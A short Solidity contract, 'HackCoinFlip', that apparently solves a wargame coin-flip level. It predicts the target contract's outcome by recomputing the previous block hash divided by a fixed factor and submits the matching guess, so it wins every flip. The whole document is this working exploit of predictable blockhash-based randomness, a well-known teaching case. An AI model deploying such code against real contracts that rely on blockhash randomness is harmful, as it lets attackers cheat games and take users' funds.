// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackCoinFlip {
    uint256 public consecutiveWins = 0;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip coinFlip;

    constructor(address _coinFlip) {
        coinFlip = ICoinFlip(_coinFlip);
    }

    function hack() public{
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 guess = blockValue / FACTOR;
            bool boolGuess = guess == 1 ? true : false;
            coinFlip.flip(boolGuess);
            consecutiveWins++;
    }
}

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}